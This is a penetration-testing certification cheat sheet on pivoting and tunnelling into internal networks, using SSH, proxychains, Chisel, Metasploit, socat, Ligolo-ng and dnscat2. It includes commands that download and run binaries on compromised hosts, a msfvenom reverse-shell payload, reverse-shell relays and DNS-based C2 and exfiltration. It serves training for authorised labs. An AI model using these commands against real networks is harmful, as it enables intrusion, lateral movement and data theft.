## Table of Contents
1. [Concepts & Mental Model](#1-concepts--mental-model)
2. [Network Recon Through a Pivot](#2-network-recon-through-a-pivot)
3. [SSH Tunneling](#3-ssh-tunneling)
4. [Proxychains](#4-proxychains)
5. [Chisel](#5-chisel)
6. [Metasploit Routing & Pivoting](#6-metasploit-routing--pivoting)
7. [Socat](#7-socat)
8. [Ligolo-ng](#8-ligolo-ng)
9. [Double Pivot & Multi-Hop](#9-double-pivot--multi-hop)
10. [DNS Tunneling](#10-dns-tunneling)
11. [Quick-Win Checklist](#11-quick-win-checklist)

---

## 1. Concepts & Mental Model

```
Attack Box (Kali)          Pivot Host (DMZ)          Target Network (Internal)
  10.10.10.5    <--VPN-->   10.10.10.50 | 172.16.1.1  <---->  172.16.1.0/24
                             [dual-homed]
```

```
# Three core pivot techniques — know when to use each:
#
# 1. Port Forwarding  — forward ONE specific port through a host
# 2. SOCKS Proxy      — route ALL traffic through a host dynamically (proxychains)
# 3. VPN-style Pivot  — add a route so your OS natively reaches target network (Ligolo)
```

```bash
# Always map your network topology first — draw it out
# Key questions before pivoting:
#   What IPs does the pivot host have? (ip a / ipconfig)
#   What routes exist on the pivot? (ip r / route print)
#   What hosts are alive on internal subnets?
#   What ports are open on internal targets?
```

---

## 2. Network Recon Through a Pivot

### 2.1 Host Discovery on Internal Subnet (from pivot)

```bash
# Ping sweep — find alive hosts on internal network from the pivot host
for i in $(seq 1 254); do ping -c 1 -W 1 172.16.1.$i | grep "bytes from" & done; wait
```

```bash
# One-liner ARP scan — faster than ping, works even if ICMP is blocked
for i in $(seq 1 254); do arping -c 1 172.16.1.$i 2>/dev/null | grep "bytes from" & done
```

```bash
# Bash TCP port check — test if a port is open without nmap (useful on limited pivot shells)
(echo > /dev/tcp/172.16.1.10/445) 2>/dev/null && echo "OPEN" || echo "CLOSED"
```

```bash
# Upload static nmap binary to pivot host for full scanning capability
# From Kali: serve it
python3 -m http.server 80

# On pivot (Linux):
wget http://10.10.10.5/nmap -O /tmp/nmap && chmod +x /tmp/nmap
/tmp/nmap -sT -Pn -p 22,80,443,445,3389 172.16.1.0/24 --open
```

```bash
# Windows pivot: use built-in portqry or Test-NetConnection
Test-NetConnection -ComputerName 172.16.1.10 -Port 445
```

```bash
# Enumerate routes on Linux pivot — shows all directly reachable subnets
ip route
ip addr show
```

```bash
# Enumerate routes on Windows pivot
ipconfig /all
route print
```

---

## 3. SSH Tunneling

> **Reference diagram for all SSH tunnels:**
> `-L` = Local forward (your port → remote)
> `-R` = Remote forward (their port → your machine)
> `-D` = Dynamic SOCKS proxy (all traffic → SSH)

### 3.1 Local Port Forwarding (-L)

```bash
# Forward a port on your local machine to an internal target through the pivot
# Use case: reach RDP on 172.16.1.10 from your Kali box
ssh -L 13389:172.16.1.10:3389 user@10.10.10.50 -N -f
# Now: xfreerdp /v:127.0.0.1:13389
```

```bash
# Forward local port 8080 to an internal web app on 172.16.1.20:80
ssh -L 8080:172.16.1.20:80 user@10.10.10.50 -N -f
# Browse: http://127.0.0.1:8080
```

```bash
# Forward to internal SMB share
ssh -L 1445:172.16.1.10:445 user@10.10.10.50 -N -f
# Then: smbclient -L //127.0.0.1 -p 1445 -U username
```

### 3.2 Dynamic Port Forwarding (-D) → SOCKS Proxy

```bash
# Create a SOCKS5 proxy on local port 1080 — route all traffic through pivot
ssh -D 1080 user@10.10.10.50 -N -f
# Then configure proxychains to use 127.0.0.1:1080 (see §4)
```

```bash
# Use key-based auth instead of password (common in lab)
ssh -D 1080 -i id_rsa user@10.10.10.50 -N -f
```

### 3.3 Remote Port Forwarding (-R)

```bash
# Forward a port from the pivot back TO your Kali box
# Use case: pivot can't reach you directly, but can SSH out
# Expose your local 4444 listener as port 4444 on the pivot's localhost
ssh -R 4444:127.0.0.1:4444 user@10.10.10.50 -N -f
# Now a reverse shell from the internal network can connect to pivot:4444 → your box
```

```bash
# Remote forward a specific internal port back to your attacker box
# Makes 172.16.1.10:80 accessible as 127.0.0.1:8080 on YOUR machine
ssh -R 8080:172.16.1.10:80 user@10.10.10.50 -N -f
```

### 3.4 SSH ProxyJump (Multi-hop SSH)

```bash
# SSH through pivot1 into pivot2 and beyond — native multi-hop
ssh -J user@pivot1:22 user@172.16.1.20
```

```bash
# Two-hop chain: Kali → pivot1 → pivot2 → target
ssh -J user@pivot1,user@pivot2 user@172.16.2.10
```

```bash
# Add to ~/.ssh/config for clean usage
# Host internal-target
#     HostName 172.16.1.20
#     User admin
#     ProxyJump pivot@10.10.10.50
```

### 3.5 SSH Tips

```bash
# Keep SSH tunnel alive (useful for long-running labs)
ssh -D 1080 user@10.10.10.50 -N -f \
  -o ServerAliveInterval=30 \
  -o ServerAliveCountMax=3 \
  -o ExitOnForwardFailure=yes
```

```bash
# Check your running tunnels
ps aux | grep ssh
```

```bash
# Kill a backgrounded SSH tunnel
kill $(pgrep -f "ssh -D 1080")
```

---

## 4. Proxychains

### 4.1 Configuration

```bash
# Edit proxychains config — set your SOCKS proxy
sudo nano /etc/proxychains4.conf

# At the bottom, ensure only ONE proxy line:
# socks5  127.0.0.1  1080    ← for SSH -D or Chisel SOCKS
# socks4  127.0.0.1  1080    ← for Metasploit socks4a proxy

# Recommended settings in the config:
# strict_chain         ← follow chain in order (good for multi-hop)
# dynamic_chain        ← skip dead proxies (good for single proxy)
# proxy_dns            ← resolve DNS through the proxy (important!)
```

```bash
# Verify proxy chain is working — should return an internal IP route
proxychains curl http://172.16.1.20/
```

### 4.2 Using Proxychains

```bash
# Nmap through proxychains — must use -sT (TCP connect) and -Pn (no ping)
# -sS SYN scan won't work through SOCKS — requires raw socket
proxychains nmap -sT -Pn -p 22,80,443,445,3389,8080 172.16.1.10 --open
```

```bash
# Scan entire subnet through pivot with reduced thread count
proxychains nmap -sT -Pn -p 80,443,445,3389 172.16.1.0/24 --open -T2
```

```bash
# CrackMapExec through pivot
proxychains crackmapexec smb 172.16.1.0/24 -u admin -p 'Password123!'
```

```bash
# Evil-WinRM through pivot
proxychains evil-winrm -i 172.16.1.10 -u Administrator -p 'Password123!'
```

```bash
# Impacket tools through pivot
proxychains python3 /opt/impacket/examples/psexec.py CORP/admin:Pass@172.16.1.10
```

```bash
# Metasploit through proxychains
proxychains msfconsole
```

```bash
# Web browsing through SOCKS (Firefox): set manual SOCKS5 proxy to 127.0.0.1:1080
# Or use FoxyProxy extension for toggle
```

---

## 5. Chisel

> **Why Chisel?** Works over HTTP — bypasses firewall rules that block raw TCP.
> Pivot runs the server, Kali runs the client (or reverse). Encrypted with TLS.

### 5.1 Setup

```bash
# Download Chisel (Linux + Windows versions)
# https://github.com/jpillora/chisel/releases
# Serve to pivot host
python3 -m http.server 80
```

```bash
# On pivot (Linux) — download Chisel binary
wget http://10.10.10.5/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

### 5.2 Forward SOCKS Proxy (Pivot → Kali)

```bash
# Kali: start Chisel server listening for connections from pivot
chisel server -p 8080 --reverse
```

```bash
# Pivot: connect back to Kali and create a reverse SOCKS5 proxy on Kali port 1080
/tmp/chisel client 10.10.10.5:8080 R:socks
# Kali now has a SOCKS5 proxy on 127.0.0.1:1080 — configure proxychains to use it
```

### 5.3 Forward SOCKS Proxy (Client → Server)

```bash
# Kali: start server
chisel server -p 8080 --socks5
```

```bash
# Pivot: connect and expose internal network as SOCKS on Kali
/tmp/chisel client 10.10.10.5:8080 socks
# Kali SOCKS5 on 127.0.0.1:1080
```

### 5.4 Single Port Forward (no SOCKS)

```bash
# Kali: server
chisel server -p 8080 --reverse
```

```bash
# Pivot: forward internal RDP (172.16.1.10:3389) → Kali localhost:13389
/tmp/chisel client 10.10.10.5:8080 R:13389:172.16.1.10:3389
# xfreerdp /v:127.0.0.1:13389
```

### 5.5 Chisel on Windows Pivot

```powershell
# Download Chisel binary to Windows pivot
certutil -urlcache -split -f http://10.10.10.5/chisel.exe C:\Windows\Temp\chisel.exe
```

```powershell
# Run reverse SOCKS from Windows pivot
C:\Windows\Temp\chisel.exe client 10.10.10.5:8080 R:socks
```

---

## 6. Metasploit Routing & Pivoting

### 6.1 Route Through a Meterpreter Session

```bash
# Add a route for the internal subnet through an existing Meterpreter session
# All Metasploit modules will now reach that subnet
msf > route add 172.16.1.0/24 <session_id>

# Verify routes
msf > route print

# Remove a route
msf > route remove 172.16.1.0/24 <session_id>
```

```bash
# Smarter — auto-add all routes discovered via Meterpreter session
msf > use post/multi/manage/autoroute
msf > set SESSION <session_id>
msf > run
```

```bash
# From within a Meterpreter session
meterpreter > run autoroute -s 172.16.1.0/24
meterpreter > run autoroute -p   # print current routes
```

### 6.2 SOCKS Proxy via Metasploit

```bash
# Start a SOCKS proxy through the routed session — enables proxychains
msf > use auxiliary/server/socks_proxy
msf > set SRVPORT 1080
msf > set VERSION 5
msf > run -j
# Configure proxychains to use socks5 127.0.0.1 1080
```

### 6.3 Port Forwarding via Meterpreter

```bash
# Forward local Kali port to internal target through Meterpreter session
meterpreter > portfwd add -l 13389 -p 3389 -r 172.16.1.10
# Connect: xfreerdp /v:127.0.0.1:13389

# List active port forwards
meterpreter > portfwd list

# Remove a forward
meterpreter > portfwd delete -l 13389
```

### 6.4 Pivoting to Scan Internal Network

```bash
# Run Nmap equivalent scanner through Metasploit routing (no proxychains needed)
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS 172.16.1.0/24
msf > set PORTS 22,80,443,445,3389
msf > set THREADS 10
msf > run
```

```bash
# SMB version scan on internal hosts
msf > use auxiliary/scanner/smb/smb_version
msf > set RHOSTS 172.16.1.0/24
msf > run
```

### 6.5 Pivoting with a New Payload

```bash
# Generate a payload that connects back to the PIVOT HOST (not your Kali)
# Pivot relays the connection back to you via session routing
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.1.1 LPORT=4444 -f exe -o shell.exe
```

```bash
# Set up listener on Kali
msf > use exploit/multi/handler
msf > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf > set LHOST 0.0.0.0
msf > set LPORT 4444
msf > run
```

---

## 7. Socat

> **Why Socat?** Lightweight, often already on Linux systems, great for simple port relays.

### 7.1 TCP Port Relay (Port Forward Without SSH)

```bash
# Relay all traffic from pivot:8080 → internal target:80
# Run this ON the pivot host
socat TCP-LISTEN:8080,fork TCP:172.16.1.20:80
# Now connect to pivot:8080 from Kali → reaches 172.16.1.20:80
```

```bash
# Relay RDP through pivot
socat TCP-LISTEN:13389,fork TCP:172.16.1.10:3389
# xfreerdp /v:10.10.10.50:13389
```

### 7.2 Reverse Shell Relay (Double Relay)

```bash
# Use socat to relay a reverse shell from internal host → Kali
# On pivot: relay port 4444 back to Kali
socat TCP-LISTEN:4444,fork TCP:10.10.10.5:4444
# Internal host: connect to pivot:4444 → traffic goes to Kali:4444
```

### 7.3 UDP Relay

```bash
# Forward UDP traffic through pivot (useful for DNS, SNMP, etc.)
socat UDP-LISTEN:53,fork UDP:172.16.1.10:53
```

### 7.4 Socat on Windows (uploaded binary)

```powershell
# Relay on Windows pivot (socat.exe uploaded)
.\socat.exe TCP-LISTEN:13389,fork TCP:172.16.1.10:3389
```

---

## 8. Ligolo-ng

> **Why Ligolo?** Creates a virtual TUN interface on Kali — your OS natively routes
> traffic to internal networks. No proxychains needed. Supports UDP. Feels like a VPN.

### 8.1 Setup

```bash
# Download: https://github.com/nicocha30/ligolo-ng/releases
# Two binaries: proxy (Kali) + agent (pivot host)
```

```bash
# On Kali: create TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

```bash
# Start Ligolo proxy (server) on Kali
./proxy -selfcert -laddr 0.0.0.0:11601
```

### 8.2 Connect Agent from Pivot

```bash
# Upload agent to pivot, then run it (Linux)
./agent -connect 10.10.10.5:11601 -ignore-cert
```

```powershell
# Windows pivot
.\agent.exe -connect 10.10.10.5:11601 -ignore-cert
```

### 8.3 Start Tunnel & Add Routes

```bash
# In Ligolo proxy console — select the session
ligolo-ng » session
# Choose the session number

# Start the tunnel
ligolo-ng » start

# Add route on Kali for internal subnet
sudo ip route add 172.16.1.0/24 dev ligolo

# Now: ping 172.16.1.10 from Kali directly — no proxychains!
# nmap, impacket, browser — all work natively
nmap -sT -Pn -p- 172.16.1.10
```

### 8.4 Expose a Local Kali Listener to Internal Network (Reverse Listeners)

```bash
# Allow internal host to reach Kali's port 4444 via Ligolo listener
# In Ligolo proxy console:
ligolo-ng » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444

# Internal target connects to pivot:4444 → arrives at Kali:4444
# Set LHOST to pivot's internal IP in your payload
```

---

## 9. Double Pivot & Multi-Hop

> When internal Target A can reach Network B, but you can only reach A through the first pivot.

```
Kali → Pivot1 (DMZ) → Pivot2 (Internal) → Target (Deep Internal)
10.x     10.x | 172.16.1.x    172.16.1.x | 192.168.2.x    192.168.2.x
```

### 9.1 SSH Double Pivot (Nested Tunnels)

```bash
# Step 1: SOCKS proxy through pivot1 (Kali → Pivot1 → 172.16.1.0/24)
ssh -D 1080 user@pivot1 -N -f

# Step 2: SSH through proxychains to pivot2 and create second SOCKS proxy on port 1081
proxychains ssh -D 1081 user@172.16.1.50 -N -f

# Step 3: Update proxychains.conf to chain both
# strict_chain
# socks5 127.0.0.1 1080
# socks5 127.0.0.1 1081
# Now reach 192.168.2.0/24 through the full chain
```

### 9.2 Chisel Double Pivot

```bash
# Kali: server listening
chisel server -p 8080 --reverse

# Pivot1: connect to Kali, expose SOCKS on Kali:1080
/tmp/chisel client 10.10.10.5:8080 R:1080:socks

# From Kali, through proxychains via pivot1, deliver chisel to pivot2 and run:
proxychains /tmp/chisel client 10.10.10.5:8080 R:1081:socks
# Kali now has 1080 (via pivot1) and 1081 (via pivot2)
```

### 9.3 Metasploit Double Pivot

```bash
# Session 1: shell on pivot1
# Session 2: shell on pivot2 (spawned through MSF routing via session 1)

# Add routes for both subnets
msf > route add 172.16.1.0/24 1   # via session 1 (pivot1)
msf > route add 192.168.2.0/24 2  # via session 2 (pivot2)

# Metasploit modules now reach 192.168.2.0/24 automatically
```

### 9.4 Ligolo Double Pivot

```bash
# On Kali: create second TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up

# On Pivot2: run agent connecting BACK to Kali (Ligolo supports multiple sessions)
./agent -connect 10.10.10.5:11601 -ignore-cert

# In Ligolo proxy: select pivot2 session, start tunnel on ligolo2
# Add route for deep network:
sudo ip route add 192.168.2.0/24 dev ligolo2
```

---

## 10. DNS Tunneling

> Use when only DNS traffic is allowed outbound. Slow but effective for C2/data exfil.

```bash
# dnscat2 — C2 over DNS — requires you control a DNS server/domain

# Kali (server): start dnscat2 server on your controlled domain
ruby dnscat2.rb --dns "domain=tunnel.yourdomain.com,host=10.10.10.5" --no-cache
```

```bash
# Pivot (client): connect back via DNS queries (pure DNS — no raw TCP needed)
./dnscat2 --dns server=10.10.10.5,port=53 --secret=<secret>
```

```bash
# Once connected: create a tunnel inside dnscat2 shell
dnscat2> window -i 1
dnscat2> listen 127.0.0.1:13389 172.16.1.10:3389
# RDP via: xfreerdp /v:127.0.0.1:13389
```

---

## 11. Quick-Win Checklist

```
INITIAL ACCESS TO PIVOT
[ ] Get a stable shell (upgrade to meterpreter or SSH if possible)
[ ] Run: ip a / ipconfig — find all NICs and IPs
[ ] Run: ip route / route print — find internal subnets
[ ] Run: arp -a — see recently contacted hosts

CHOOSE YOUR PIVOT METHOD
[ ] SSH available on pivot? → SSH -D SOCKS (§3.2) + proxychains
[ ] No SSH, HTTP outbound? → Chisel reverse SOCKS (§5.2)
[ ] Meterpreter session? → autoroute + socks_proxy (§6.1, §6.2)
[ ] Want native routing (no proxychains)? → Ligolo-ng (§8)
[ ] Simple single-port relay? → socat (§7.1)

INTERNAL RECON
[ ] Ping sweep / ARP scan internal subnet
[ ] Static nmap or bash TCP check for key ports
[ ] Add route / configure proxychains
[ ] Verify access: proxychains curl / proxychains nmap

COMMON GOTCHAS
[ ] proxychains nmap: always use -sT -Pn (no SYN scan, no ping)
[ ] Kerberos: sync time even through pivot (ntpdate via proxychains)
[ ] Metasploit payloads: LHOST = pivot internal IP (not Kali)
[ ] Double pivot: use strict_chain in proxychains + correct port order
[ ] Ligolo: add ip route on Kali after starting tunnel
```

---

## Port & Tool Reference

| Tool | Protocol | Direction | Best For |
|------|----------|-----------|----------|
| SSH -L | TCP | Kali → Target | Single port, you initiate SSH |
| SSH -D | TCP/SOCKS | Kali → Target | Full proxychains pivot |
| SSH -R | TCP | Pivot → Kali | Pivot initiates, no inbound to Kali |
| Chisel | HTTP/TCP | Either | Firewall bypass, HTTP-allowed envs |
| Ligolo-ng | TCP | Agent → Proxy | Native routing, no proxychains |
| Socat | TCP/UDP | On pivot | Simple relay, no extra binaries |
| MSF route | TCP | Via session | All-Metasploit workflow |
| dnscat2 | DNS | Via DNS | DNS-only outbound allowed |

---

## Payload LHOST Logic

```
Situation                          LHOST value
─────────────────────────────────────────────────────────────
Direct access to target            Your Kali IP
Target reaches you via pivot       Pivot's IP (internal NIC)
Ligolo tunnel active               Ligolo listener (pivot IP)
MSF routing + portfwd              127.0.0.1 (local forward)
```

---

*eCPPTv3 Cheatsheet — 06_pivoting_tunneling.md*
